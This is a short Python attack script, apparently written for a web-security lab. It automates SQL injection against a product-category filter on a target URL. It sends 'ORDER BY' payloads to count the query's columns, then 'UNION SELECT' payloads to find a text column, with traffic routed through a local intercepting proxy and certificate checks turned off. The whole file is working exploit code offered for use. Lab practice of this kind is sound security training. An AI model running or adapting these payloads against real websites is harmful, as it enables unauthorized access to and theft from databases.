# to count the number of columns in the queary made  


import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    path = "/filter?category=Tech+%26+gifts"
    for i in range(1, 50):
        sql_payload = "'+order+by+%s--" % i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
    return None



def exploit_sqli_string_field(url, num_col):
    path = "/filter?category=Tech+%26+gifts"
    for i in range(1, num_col + 1):
        string = "'ZTazwd'"
        payload_list = ['NULL'] * num_col
        payload_list[i - 1] = string
        sql_payload = "' UNION select " + ','.join(payload_list) + "--"
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return None




if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("Usage: python script.py <URL>")
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + ".")
        
        print("[+] Figuring out which column contain text...")
        
        string_column = exploit_sqli_string_field(url, num_col)
        
        if string_column:
        
            print("[+] The column that contains text is " + str(string_column) + ".")
        else:
            print("[-] We were not able to find a column that has string data type")
    else:
        print("[-] Unsuccessful")
